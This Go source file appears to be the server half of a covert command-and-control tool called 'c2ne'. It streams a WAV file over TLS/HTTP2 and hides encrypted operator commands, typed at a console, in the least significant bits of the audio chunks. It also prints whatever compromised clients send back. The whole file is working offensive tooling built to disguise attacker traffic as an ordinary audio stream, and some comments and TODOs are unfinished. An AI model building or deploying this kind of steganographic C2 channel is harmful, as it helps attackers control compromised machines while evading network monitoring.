package main

import (
	"crypto/tls"
	"fmt"
	//"io"
	"log"
	"net/http"
	"time"
	"sync"
	"os"
	"io"

	"golang.org/x/net/http2"
	"github.com/chzyer/readline"
)

var	baseAudioTrack []byte
var (
	echo_to_stdout string = "off"
	cliMessageChan = make(chan string, 10)
	command string = ""
	pendingCommand string =""
)

func audioCallHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Println("server: client connected, proto:")
	
	baseAudioTrack, _ = os.ReadFile("sample.wav")
	//if err != nil{
	//	fmt.Println("not in location file:", filename)
	//}
	index :=0
	ChunkSize := 640 //per 20 ms
	totalTrackBytes := len(baseAudioTrack)
	byteOffset :=0

	/*if index==0{
		byteOffset+= int(h.DataStart) //TODO if it is the first chunk, dont include header in the chunk
	}*/
	

	//so we can immideately send the response, so client doesnt block till who-knows-when go sends 
	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "streaming not supported", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "text/plain")
	w.WriteHeader(http.StatusOK)
	flusher.Flush()

	var wg sync.WaitGroup

	//read from client (r.Body blocks until client writes)
	wg.Go(func() {
		buf := make([]byte, 1024)
		for {
			n, err := r.Body.Read(buf)
			if n > 0 {
				fmt.Printf("server received: %s", buf[:n])
			}
			if err != nil {
				// io.EOF means client closed their write side
				return
			}
		}
	})

	// write to client every 5 seconds
	// ticker reuses timer. time.After doesnt
	wg.Go(func() {
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-r.Context().Done(): //return when client disconnects
				return
			case <-ticker.C: //runs every 20 ms

				num:=0
				chunk := make([]byte, ChunkSize)
				byteOffset = index*ChunkSize //TODO logic to set header byteoffset, if index=0
				if byteOffset+ChunkSize > totalTrackBytes {
					num =copy(chunk, baseAudioTrack[byteOffset:totalTrackBytes])
					index=0
				}else{
					num =copy(chunk, baseAudioTrack[byteOffset:byteOffset+ChunkSize])
				}

				encodedChunk := encodingEngine_server(chunk, num)
				w.Write(encodedChunk)
				flusher.Flush() // critical — without this, bytes sit in buffer
				index++
			}
		}
	})
	wg.Wait()
}

func encodingEngine_server(chunk []byte, ChunkSize int) ([]byte){

	cmd_len_threshold := ChunkSize/8
	var err error

	select {
	case cmd := <-cliMessageChan:
		command = cmd
		if len(command) > 0 {
			command, err = encrypt(key, []byte(command))
			if err!=nil{
				fmt.Println("Encryption errored out -", err)
			}
			command = "STRT"+command+"STOP"
			//fmt.Println("Enrypted command =", []byte(command))
		}
		
		if len(pendingCommand)>0{
			command = pendingCommand[:min(len(pendingCommand), cmd_len_threshold)]+command
			pendingCommand = pendingCommand[min(len(pendingCommand), cmd_len_threshold):]
		}
		if len(command)>cmd_len_threshold{
			pendingCommand += command[cmd_len_threshold:]
			command = command[:cmd_len_threshold]
		}

	default:
		if len(pendingCommand)>0{
			command = pendingCommand[:min(len(pendingCommand), cmd_len_threshold)]+command
			pendingCommand = pendingCommand[min(len(pendingCommand), cmd_len_threshold):]					
			//fmt.Printf("Injecting payload (%d characters)...\n", len(command)+8)
			goto label1
			//ensures pending msg gets sent, when there's no cli message but there's pending msg
		}

		//dont go through the whole thing of encoding, if we dont have any message to be sent.
		return chunk[:ChunkSize]
	}
label1 :
	commandBytes := []byte(command) //we use this, so go doesnt increase rune size on seeing probable non-utf8 chars in ciphertext
	
	//----code to inject LSB from cmd_bitstring array into audio stream.
	if echo_to_stdout=="on"{
		fmt.Println("Chunk length = ", len(chunk))
		fmt.Printf("Injecting payload (%d characters)...\n", len(command))
	}

	cmd_bitIndex :=0
	cmd_charIndex :=0
	var audio_stegd_bytes []byte
	for _, aud_byte := range chunk{
		if cmd_charIndex == len(commandBytes) {
			if echo_to_stdout=="on"{
				fmt.Println("stegged bs length ",len(audio_stegd_bytes), "\nstegged bs ", audio_stegd_bytes)
			}
			break
		}

		ival := (commandBytes[cmd_charIndex] >> (7 - uint(cmd_bitIndex))) & 1 //bitShift bit extraction
		aud_byte = (aud_byte & 0xFE) | ival

		audio_stegd_bytes= append(audio_stegd_bytes, aud_byte)
		//fmt.Println("cmd_bitstring at ", cmd_charIndex, "=", string(byte(cmd_bitstring[cmd_charIndex])))

		cmd_bitIndex++
		if cmd_bitIndex==8{
			cmd_charIndex ++
			cmd_bitIndex =0
		}

	}
	//fmt.Println("command encode successful")

	//*********-------------------end------------------*****************//
	copy(chunk[:cmd_charIndex*8], audio_stegd_bytes[:cmd_charIndex*8])

	if echo_to_stdout == "on"{
		fmt.Println("Log - ",time.Now()," Request recieved and Replied to ", "443")
	}
	return (chunk[:ChunkSize])
}

func main() {

	go StartCLIConsole()
	mux := http.NewServeMux()
	mux.HandleFunc("/echo", audioCallHandler)

	srv := &http.Server{
		Addr:    ":8443",
		Handler: mux,
		TLSConfig: &tls.Config{
			NextProtos: []string{"h2", "http/1.1"},
		},
	}
	http2.ConfigureServer(srv, &http2.Server{})

	log.Println("server: listening on :8443")
	log.Fatal(srv.ListenAndServeTLS("server.crt", "server.key"))
}

// StartCLIConsole accepts asynchronous text inputs from operators
var rl *readline.Instance //so that my decoder can print without echoing past commands back
func StartCLIConsole() {
	fmt.Println("c2ne is active. Type a command and press Enter")
    rl, err := readline.New("c2ne> ")
    if err != nil {
        log.Fatal(err)
    }
    defer rl.Close()

    for {
        line, err := rl.Readline()
        if err == io.EOF || err == readline.ErrInterrupt {
            break
        }
        if err != nil {
            log.Println("read error:", err)
            continue
        }
        if line != "" {
			cliMessageChan <- line
		}
    }
}